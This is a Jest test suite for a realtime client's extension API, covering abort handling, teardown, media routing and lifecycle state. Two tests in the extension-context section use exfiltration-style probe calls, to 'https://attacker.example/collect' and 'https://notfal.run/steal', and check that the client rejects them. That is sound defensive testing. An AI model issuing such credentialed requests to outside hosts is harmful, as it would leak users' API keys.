import { createConfig } from "./config";
import { createRealtimeClient } from "./realtime";
import {
  defineRealtimeExtension,
  type RealtimeSession,
} from "./realtime/extension";

describe("realtime extensions", () => {
  beforeAll(() => {
    global.fetch = jest.fn() as any;
  });

  function extension(cleanup = jest.fn()) {
    return defineRealtimeExtension<
      { endpointId?: string; label: string; abortSignal?: AbortSignal },
      RealtimeSession & { label: string }
    >({
      id: "test/world",
      defaultEndpoint: "test/world",
      supports: (endpointId) => endpointId === "test/world",
      async open(context, options) {
        context.addCleanup(cleanup);
        return {
          label: options.label,
          close: jest.fn(),
        };
      },
    });
  }

  it("opens an explicitly supplied extension with its typed session", async () => {
    const client = createRealtimeClient({
      config: createConfig({ credentials: "test-key" }),
    });
    const world = extension();

    const session = await client.open(world, {
      label: "hello",
    });

    expect(session.label).toBe("hello");
  });

  it("uses the extension default when endpointId is explicitly undefined", async () => {
    const client = createRealtimeClient({
      config: createConfig({ credentials: "test-key" }),
    });

    const session = await client.open(extension(), {
      endpointId: undefined,
      label: "defaulted",
    });

    expect(session.label).toBe("defaulted");
  });

  it("rejects an endpoint the extension declares it cannot open", async () => {
    // `supports` is an optional guard, not a routing registry: catch a stale or mistyped id at the
    // call site rather than partway through a negotiation that cannot succeed.
    const client = createRealtimeClient({
      config: createConfig({ credentials: "test-key" }),
    });

    await expect(
      client.open(extension(), {
        endpointId: "someone-else/world",
        label: "wrong",
      }),
    ).rejects.toThrow(
      'Realtime extension "test/world" does not support "someone-else/world".',
    );
  });

  it("opens an extension that declares no endpoint constraint", async () => {
    // Most protocols cannot recognize their own endpoints by name, so they omit `supports` entirely.
    // Omitting it must not be read as refusing everything.
    const anyEndpoint = defineRealtimeExtension<
      { endpointId?: string },
      RealtimeSession
    >({
      id: "test/unconstrained",
      async open() {
        return { close: jest.fn() };
      },
    });
    const client = createRealtimeClient({
      config: createConfig({ credentials: "test-key" }),
    });

    await expect(
      client.open(anyEndpoint, { endpointId: "anything/at-all" }),
    ).resolves.toBeDefined();
  });

  it("runs cleanup exactly once when close is called repeatedly", async () => {
    const cleanup = jest.fn();
    const client = createRealtimeClient({
      config: createConfig({ credentials: "test-key" }),
    });
    const session = await client.open(extension(cleanup), {
      endpointId: "test/world",
      label: "cleanup",
    });

    await session.close();
    await session.close();

    expect(cleanup).toHaveBeenCalledTimes(1);
  });

  it("makes every concurrent close await the same teardown", async () => {
    let finishCleanup!: () => void;
    const cleanupDone = new Promise<void>((resolve) => {
      finishCleanup = resolve;
    });
    const cleanup = jest.fn(() => cleanupDone);
    const client = createRealtimeClient({
      config: createConfig({ credentials: "test-key" }),
    });
    const session = await client.open(extension(cleanup), {
      endpointId: "test/world",
      label: "concurrent-cleanup",
    });

    const first = session.close();
    const second = session.close();
    expect(second).toBe(first);

    let secondFinished = false;
    void second.then(() => {
      secondFinished = true;
    });
    await Promise.resolve();
    expect(secondFinished).toBe(false);

    finishCleanup();
    await Promise.all([first, second]);
    expect(cleanup).toHaveBeenCalledTimes(1);
  });

  it("shares teardown with a synchronous abort-listener close", async () => {
    const cleanup = jest.fn();
    const extensionClose = jest.fn();
    let closeFromAbort: Promise<void> | undefined;
    const client = createRealtimeClient({
      config: createConfig({ credentials: "test-key" }),
    });
    const reentrant = defineRealtimeExtension<
      { endpointId?: string },
      RealtimeSession
    >({
      id: "test/reentrant-cleanup",
      defaultEndpoint: "test/reentrant-cleanup",
      async open(context) {
        context.addCleanup(cleanup);
        context.signal.addEventListener("abort", () => {
          closeFromAbort = context.close();
        });
        return { close: extensionClose };
      },
    });
    const session = await client.open(reentrant, {});

    const closeFromCaller = session.close();

    expect(closeFromAbort).toBe(closeFromCaller);
    await closeFromCaller;
    expect(extensionClose).toHaveBeenCalledTimes(1);
    expect(cleanup).toHaveBeenCalledTimes(1);
  });

  it("does not invoke an extension when opening was already aborted", async () => {
    const controller = new AbortController();
    const reason = new Error("user left");
    controller.abort(reason);
    const world = extension();
    const open = jest.spyOn(world, "open");
    const client = createRealtimeClient({
      config: createConfig({ credentials: "test-key" }),
    });

    await expect(
      client.open(world, {
        label: "aborted",
        abortSignal: controller.signal,
      }),
    ).rejects.toBe(reason);

    expect(open).not.toHaveBeenCalled();
  });

  it("closes a session that finishes opening after abort", async () => {
    const controller = new AbortController();
    const reason = new Error("user left during setup");
    const close = jest.fn().mockRejectedValue(new Error("late close failed"));
    let finishSetup = () => undefined;
    const setup = new Promise<void>((resolve) => {
      finishSetup = resolve;
    });
    const late = defineRealtimeExtension<
      { endpointId?: string },
      RealtimeSession
    >({
      id: "test/late-session",
      defaultEndpoint: "test/late-session",
      async open() {
        await setup;
        return { close };
      },
    });
    const client = createRealtimeClient({
      config: createConfig({ credentials: "test-key" }),
    });

    const opening = client.open(late, { abortSignal: controller.signal });
    controller.abort(reason);
    finishSetup();

    await expect(opening).rejects.toBe(reason);
    expect(close).toHaveBeenCalledTimes(1);
  });

  it("contains a rejecting session close hook during abort", async () => {
    const controller = new AbortController();
    const close = jest.fn().mockRejectedValue(new Error("close failed"));
    const brokenClose = defineRealtimeExtension<
      { endpointId?: string },
      RealtimeSession
    >({
      id: "test/broken-close",
      defaultEndpoint: "test/broken-close",
      async open() {
        return { close };
      },
    });
    const client = createRealtimeClient({
      config: createConfig({ credentials: "test-key" }),
    });
    const session = await client.open(brokenClose, {
      abortSignal: controller.signal,
    });

    controller.abort(new Error("user left"));

    await expect(session.close()).resolves.toBeUndefined();
    expect(close).toHaveBeenCalledTimes(1);
  });

  it.each([
    [
      "throws",
      () => {
        throw new Error("late");
      },
    ],
    ["rejects", () => Promise.reject(new Error("late"))],
  ])("contains a late cleanup that %s after abort", async (_, cleanup) => {
    const controller = new AbortController();
    const reason = new Error("user left");
    let finishSetup = () => undefined;
    const setup = new Promise<void>((resolve) => {
      finishSetup = resolve;
    });
    const late = defineRealtimeExtension<
      { endpointId?: string },
      RealtimeSession
    >({
      id: "test/late-cleanup",
      defaultEndpoint: "test/late-cleanup",
      async open(context) {
        await setup;
        context.addCleanup(cleanup);
        return { close: jest.fn() };
      },
    });
    const client = createRealtimeClient({
      config: createConfig({ credentials: "test-key" }),
    });

    const opening = client.open(late, { abortSignal: controller.signal });
    controller.abort(reason);
    finishSetup();

    await expect(opening).rejects.toBe(reason);
    await Promise.resolve();
  });

  it("awaits an asynchronous cleanup registered after abort", async () => {
    const controller = new AbortController();
    const reason = new Error("user left");
    let finishSetup = () => undefined;
    let finishCleanup = () => undefined;
    const setup = new Promise<void>((resolve) => {
      finishSetup = resolve;
    });
    const cleanupDone = new Promise<void>((resolve) => {
      finishCleanup = resolve;
    });
    const cleanup = jest.fn(() => cleanupDone);
    const late = defineRealtimeExtension<
      { endpointId?: string },
      RealtimeSession
    >({
      id: "test/await-late-cleanup",
      defaultEndpoint: "test/await-late-cleanup",
      async open(context) {
        await setup;
        context.addCleanup(cleanup);
        return { close: jest.fn() };
      },
    });
    const client = createRealtimeClient({
      config: createConfig({ credentials: "test-key" }),
    });

    const opening = client.open(late, { abortSignal: controller.signal });
    let settled = false;
    void opening.then(
      () => {
        settled = true;
      },
      () => {
        settled = true;
      },
    );
    controller.abort(reason);
    finishSetup();
    await Promise.resolve();
    await Promise.resolve();

    expect(cleanup).toHaveBeenCalledTimes(1);
    expect(settled).toBe(false);
    finishCleanup();
    await expect(opening).rejects.toBe(reason);
  });

  it("awaits a late cleanup when aborted extension setup rejects", async () => {
    const controller = new AbortController();
    const setupFailure = new Error("setup failed after abort");
    let finishSetup = () => undefined;
    let finishCleanup = () => undefined;
    const setup = new Promise<void>((resolve) => {
      finishSetup = resolve;
    });
    const cleanupDone = new Promise<void>((resolve) => {
      finishCleanup = resolve;
    });
    const cleanup = jest.fn(() => cleanupDone);
    const broken = defineRealtimeExtension<
      { endpointId?: string },
      RealtimeSession
    >({
      id: "test/reject-after-abort",
      defaultEndpoint: "test/reject-after-abort",
      async open(context) {
        await setup;
        context.addCleanup(cleanup);
        throw setupFailure;
      },
    });
    const client = createRealtimeClient({
      config: createConfig({ credentials: "test-key" }),
    });

    const opening = client.open(broken, { abortSignal: controller.signal });
    let settled = false;
    void opening.then(
      () => {
        settled = true;
      },
      () => {
        settled = true;
      },
    );
    controller.abort(new Error("user left"));
    finishSetup();
    await Promise.resolve();
    await Promise.resolve();

    expect(cleanup).toHaveBeenCalledTimes(1);
    expect(settled).toBe(false);
    finishCleanup();
    await expect(opening).rejects.toBe(setupFailure);
  });

  it("preserves the caller's abort reason while an extension is opening", async () => {
    const controller = new AbortController();
    const reason = new Error("user left during negotiation");
    const waiting = defineRealtimeExtension<
      { endpointId?: string },
      RealtimeSession
    >({
      id: "test/waiting",
      defaultEndpoint: "test/waiting",
      open(context) {
        return new Promise((_, reject) => {
          context.signal.addEventListener(
            "abort",
            () => reject(context.signal.reason),
            { once: true },
          );
        });
      },
    });
    const client = createRealtimeClient({
      config: createConfig({ credentials: "test-key" }),
    });

    const opening = client.open(waiting, { abortSignal: controller.signal });
    controller.abort(reason);

    await expect(opening).rejects.toBe(reason);
  });

  it("reports an extension that cannot name an endpoint to open", async () => {
    const noDefault = defineRealtimeExtension<
      { endpointId?: string },
      RealtimeSession
    >({
      id: "test/no-default",
      async open() {
        return { close: jest.fn() };
      },
    });
    const client = createRealtimeClient({
      config: createConfig({ credentials: "test-key" }),
    });

    await expect(client.open(noDefault, {})).rejects.toThrow(
      'Realtime extension "test/no-default" requires an endpointId option',
    );
  });
});

describe("realtime extension context additions", () => {
  it("context.run rejects absolute destinations", async () => {
    const client = createRealtimeClient({
      config: createConfig({ credentials: "secret-key" }),
    });
    const probe = defineRealtimeExtension<
      Record<string, never>,
      RealtimeSession
    >({
      id: "test/untrusted-run",
      defaultEndpoint: "test/untrusted-run",
      async open(context) {
        await context.run("  https://notfal.run/steal  ", { input: {} });
        return { close: jest.fn() };
      },
    });

    await expect(client.open(probe, {})).rejects.toThrow(
      "requires an app endpoint id",
    );
  });

  it("context.fetch attaches the parent client's credentials", async () => {
    // The point of this method existing: the extension makes the call, so the APPLICATION never has
    // to inject a credentialed fetch and never handles a key.
    const seen: Array<{ url: string; init: RequestInit }> = [];
    const client = createRealtimeClient({
      config: createConfig({
        credentials: "secret-key",
        fetch: (async (url: string, init: RequestInit) => {
          seen.push({ url, init });
          return new Response("{}", { status: 200 });
        }) as any,
      }),
    });

    const probe = defineRealtimeExtension<
      Record<string, never>,
      RealtimeSession
    >({
      id: "test/fetch",
      defaultEndpoint: "test/fetch",
      async open(context) {
        const response = await context.fetch("https://wma.fal.run/session", {
          body: JSON.stringify({ app_id: "x" }),
        });
        expect(response.status).toBe(200);
        return { close: jest.fn() };
      },
    });

    await client.open(probe, {});
    expect(seen).toHaveLength(1);
    expect(seen[0].url).toBe("https://wma.fal.run/session");
    expect((seen[0].init.headers as Record<string, string>).Authorization).toBe(
      "Key secret-key",
    );
    // Defaults to POST, and the abort signal is wired without the extension asking.
    expect(seen[0].init.method).toBe("POST");
    expect(seen[0].init.signal).toBeDefined();
  });

  it("context.fetch rejects extension-controlled non-fal destinations", async () => {
    const fetch = jest.fn(async () => new Response("{}"));
    const requestMiddleware = jest.fn(async (request) => request);
    const client = createRealtimeClient({
      config: createConfig({
        credentials: "secret-key",
        fetch: fetch as any,
        requestMiddleware,
      }),
    });
    const probe = defineRealtimeExtension<
      Record<string, never>,
      RealtimeSession
    >({
      id: "test/untrusted-fetch",
      defaultEndpoint: "test/untrusted-fetch",
      async open(context) {
        await context.fetch("https://attacker.example/collect");
        return { close: jest.fn() };
      },
    });

    await expect(client.open(probe, {})).rejects.toThrow(
      "restricted to fal-operated HTTPS hosts",
    );
    expect(requestMiddleware).not.toHaveBeenCalled();
    expect(fetch).not.toHaveBeenCalled();
  });

  it.each([
    ["Headers", new Headers([["X-Trace", "from-headers"]])],
    ["header tuples", [["X-Trace", "from-tuples"]] as [string, string][]],
  ])("context.fetch preserves %s through middleware", async (_, headers) => {
    const seen: RequestInit[] = [];
    const requestMiddleware = jest.fn(async (request) => request);
    const client = createRealtimeClient({
      config: createConfig({
        credentials: "secret-key",
        requestMiddleware,
        fetch: async (url, init = {}) => {
          expect(url).toBe("https://wma.fal.run/session");
          seen.push(init);
          return new Response("{}");
        },
      }),
    });
    const probe = defineRealtimeExtension<
      Record<string, never>,
      RealtimeSession
    >({
      id: "test/header-shapes",
      defaultEndpoint: "test/header-shapes",
      async open(context) {
        await context.fetch("https://wma.fal.run/session", { headers });
        return { close: jest.fn() };
      },
    });

    await client.open(probe, {});

    expect(requestMiddleware).toHaveBeenCalledWith(
      expect.objectContaining({
        headers: { "x-trace": expect.stringMatching(/^from-/) },
      }),
    );
    expect(new Headers(seen[0].headers).get("x-trace")).toMatch(/^from-/);
  });

  it("routes context.media and context.data to the caller's handlers", async () => {
    const client = createRealtimeClient({
      config: createConfig({ credentials: "k" }),
    });
    const stream = { id: "s" } as unknown as MediaStream;
    const probe = defineRealtimeExtension<
      // Record<never, never>, NOT Record<string, never>. The latter says "every string key maps to
      // never", which makes `Options & RealtimeOpenOptions` contradictory and rejects onMedia/onState/
      // onDiagnostic at the call site — an extension with no product inputs of its own would otherwise
      // be unable to receive any kernel option.
      Record<never, never>,
      RealtimeSession
    >({
      id: "test/channels",
      defaultEndpoint: "test/channels",
      async open(context) {
        context.media(stream);
        context.data('{"a":1}');
        return { close: jest.fn() };
      },
    });

    const media: MediaStream[] = [];
    const data: string[] = [];
    await client.open(probe, {
      onMedia: (value) => media.push(value),
      onData: (value) => data.push(value),
    });
    expect(media).toEqual([stream]);
    expect(data).toEqual(['{"a":1}']);
  });

  it("drops media and data emitted after teardown begins", async () => {
    const client = createRealtimeClient({
      config: createConfig({ credentials: "k" }),
    });
    let emitMedia!: (stream: MediaStream) => void;
    let emitData!: (raw: string) => void;
    const probe = defineRealtimeExtension<
      Record<never, never>,
      RealtimeSession
    >({
      id: "test/closed-channels",
      defaultEndpoint: "test/closed-channels",
      async open(context) {
        emitMedia = context.media;
        emitData = context.data;
        return { close: jest.fn() };
      },
    });
    const media = jest.fn();
    const data = jest.fn();
    const session = await client.open(probe, {
      onMedia: media,
      onData: data,
    });

    const closing = session.close();
    emitMedia({ id: "late" } as unknown as MediaStream);
    emitData("late");
    await closing;

    expect(media).not.toHaveBeenCalled();
    expect(data).not.toHaveBeenCalled();
  });

  it("a throwing media or data handler cannot fail the session", async () => {
    // These fire from inside pc.ontrack and channel.onmessage, where a throw lands in a browser event
    // handler no caller can catch. An application whose render throws must not take the session down,
    // and one unparseable payload must not end a stream that is still delivering frames.
    const client = createRealtimeClient({
      config: createConfig({ credentials: "k" }),
    });
    const probe = defineRealtimeExtension<
      // Record<never, never>, NOT Record<string, never>. The latter says "every string key maps to
      // never", which makes `Options & RealtimeOpenOptions` contradictory and rejects onMedia/onState/
      // onDiagnostic at the call site — an extension with no product inputs of its own would otherwise
      // be unable to receive any kernel option.
      Record<never, never>,
      RealtimeSession
    >({
      id: "test/throwing",
      defaultEndpoint: "test/throwing",
      async open(context) {
        context.media({ id: "s" } as unknown as MediaStream);
        context.data("oops");
        return { close: jest.fn(), reached: true } as never;
      },
    });

    const session = await client.open(probe, {
      onMedia: () => {
        throw new Error("render exploded");
      },
      onData: () => {
        throw new Error("parse exploded");
      },
    });
    // open() resolved at all, which is the assertion: both throws were swallowed at the boundary.
    expect((session as unknown as { reached: boolean }).reached).toBe(true);
    expect(session.state).toBe("live");
  });

  it("omitting the handlers is not an error an extension has to guard", async () => {
    // So an extension can publish unconditionally instead of checking whether anyone is listening —
    // brainrot returns no media at all, and the transform app returns no data.
    const client = createRealtimeClient({
      config: createConfig({ credentials: "k" }),
    });
    const probe = defineRealtimeExtension<
      // Record<never, never>, NOT Record<string, never>. The latter says "every string key maps to
      // never", which makes `Options & RealtimeOpenOptions` contradictory and rejects onMedia/onState/
      // onDiagnostic at the call site — an extension with no product inputs of its own would otherwise
      // be unable to receive any kernel option.
      Record<never, never>,
      RealtimeSession
    >({
      id: "test/silent",
      defaultEndpoint: "test/silent",
      async open(context) {
        context.media({ id: "s" } as unknown as MediaStream);
        context.data("ignored");
        return { close: jest.fn() };
      },
    });
    await expect(client.open(probe, {})).resolves.toBeDefined();
  });

  it("context.fetch does not call the configured fetch as a method", async () => {
    // A receiver-sensitive fetch, because native fetch is one: invoking it as config.fetch(...) sets
    // `this` to the config object and throws "Illegal invocation". A plain jest.fn() has no opinion
    // about its receiver and therefore cannot verify this constraint.
    const picky = function (this: unknown, _url: string) {
      if (this !== undefined && this !== globalThis) {
        throw new TypeError("Failed to execute 'fetch': Illegal invocation");
      }
      return Promise.resolve(new Response("{}"));
    };
    const client = createRealtimeClient({
      config: createConfig({ credentials: "k", fetch: picky as any }),
    });
    const probe = defineRealtimeExtension<
      Record<string, never>,
      RealtimeSession
    >({
      id: "test/receiver",
      async open(context) {
        await context.fetch("https://wma.fal.run/session");
        return { close: jest.fn() };
      },
    });
    await expect(
      client.open(probe, { endpointId: "test/receiver" } as never),
    ).resolves.toBeDefined();
  });

  it("context.fetch honours the request middleware, so a proxied app stays proxied", async () => {
    let target = "";
    const client = createRealtimeClient({
      config: createConfig({
        credentials: "k",
        requestMiddleware: async (request) => ({
          ...request,
          url: "https://proxy.example/forward",
        }),
        fetch: (async (url: string) => {
          target = url;
          return new Response("{}");
        }) as any,
      }),
    });
    const probe = defineRealtimeExtension<
      Record<string, never>,
      RealtimeSession
    >({
      id: "test/proxy",
      async open(context) {
        await context.fetch("https://wma.fal.run/session");
        return { close: jest.fn() };
      },
    });
    await client.open(probe, { endpointId: "test/proxy" } as never);
    expect(target).toBe("https://proxy.example/forward");
  });

  it("reports a kernel-owned lifecycle the extension cannot contradict", async () => {
    const states: string[] = [];
    const client = createRealtimeClient({
      config: createConfig({ credentials: "k" }),
    });
    const probe = defineRealtimeExtension<
      Record<string, never>,
      RealtimeSession
    >({
      id: "test/state",
      // Claims to be live while the kernel is still opening; the kernel's value wins.
      async open() {
        return { close: jest.fn(), state: "live" as const };
      },
    });
    const session = await client.open(probe, {
      endpointId: "test/state",
      onState: (next: string) => states.push(next),
    } as never);
    expect(session.state).toBe("live");
    await session.close();
    expect(session.state).toBe("closed");
    expect(states).toEqual(["live", "closed"]);
  });

  it("reports failed, not just closed, when opening throws", async () => {
    const states: string[] = [];
    const client = createRealtimeClient({
      config: createConfig({ credentials: "k" }),
    });
    const broken = defineRealtimeExtension<
      Record<string, never>,
      RealtimeSession
    >({
      id: "test/broken",
      async open() {
        throw new Error("negotiation failed");
      },
    });
    await expect(
      client.open(broken, {
        endpointId: "test/broken",
        onState: (next: string) => states.push(next),
      } as never),
    ).rejects.toThrow("negotiation failed");
    // "failed" and nothing after it. Teardown still runs, but reporting it would overwrite the only
    // thing separating a crash from a clean teardown — and "closed" is what a caller would have seen
    // anyway if this reported nothing at all.
    expect(states).toEqual(["failed"]);
  });

  it("context.fail reports failed, not closed, and tears down", async () => {
    // The distinction close() cannot express: a transport that died versus a user who disconnected.
    // A status UI must be able to render those outcomes differently.
    const states: string[] = [];
    const events: unknown[] = [];
    const cleanup = jest.fn();
    const client = createRealtimeClient({
      config: createConfig({ credentials: "k" }),
    });
    let failFromInside: ((message: string) => Promise<void>) | undefined;
    const probe = defineRealtimeExtension<
      Record<string, never>,
      RealtimeSession
    >({
      id: "test/fail",
      async open(context) {
        context.addCleanup(cleanup);
        failFromInside = (message) => context.fail(message, { relay: 0 });
        return { close: jest.fn() };
      },
    });
    const session = await client.open(probe, {
      endpointId: "test/fail",
      onState: (next: string) => states.push(next),
      onDiagnostic: (event: unknown) => events.push(event),
    } as never);

    await failFromInside!("peer connection died");
    // "failed" latches over the teardown it triggers. Publishing "closed" afterward would erase the
    // terminal cause, so anything rendering the latest value — a status pill or `session.state` —
    // would misrepresent a dead transport as a clean disconnect.
    expect(states).toEqual(["live", "failed"]);
    expect(events).toEqual([
      {
        kind: "failure",
        message: "peer connection died",
        observed: { relay: 0 },
      },
    ]);
    // Teardown really ran; failing is not a way to leak resources.
    expect(cleanup).toHaveBeenCalledTimes(1);
    expect(session.state).toBe("failed");

    // And a close() afterwards cannot launder it into a clean ending.
    await session.close();
    expect(session.state).toBe("failed");
    expect(states).toEqual(["live", "failed"]);
  });

  it("passes diagnostics through, and swallows a throwing callback", async () => {
    const events: unknown[] = [];
    const client = createRealtimeClient({
      config: createConfig({ credentials: "k" }),
    });
    const probe = defineRealtimeExtension<
      Record<string, never>,
      RealtimeSession
    >({
      id: "test/diag",
      async open(context) {
        context.diagnostic({ kind: "progress", phase: "negotiating" });
        context.diagnostic({
          kind: "failure",
          message: "no relay",
          observed: { relay: 0 },
        });
        return { close: jest.fn() };
      },
    });
    const session = await client.open(probe, {
      endpointId: "test/diag",
      onDiagnostic: (event: unknown) => {
        events.push(event);
        throw new Error("a caller's reporting bug must not fail the session");
      },
    } as never);
    expect(events).toEqual([
      { kind: "progress", phase: "negotiating" },
      { kind: "failure", message: "no relay", observed: { relay: 0 } },
    ]);
    await session.close();
  });

  it("an extension may report diagnostics with no onDiagnostic supplied", async () => {
    const client = createRealtimeClient({
      config: createConfig({ credentials: "k" }),
    });
    const probe = defineRealtimeExtension<
      Record<string, never>,
      RealtimeSession
    >({
      id: "test/quiet",
      async open(context) {
        // Must not throw: extensions report unconditionally rather than guarding every call.
        context.diagnostic({ kind: "warning", message: "degraded" });
        return { close: jest.fn() };
      },
    });
    await expect(
      client.open(probe, { endpointId: "test/quiet" } as never),
    ).resolves.toBeDefined();
  });
});
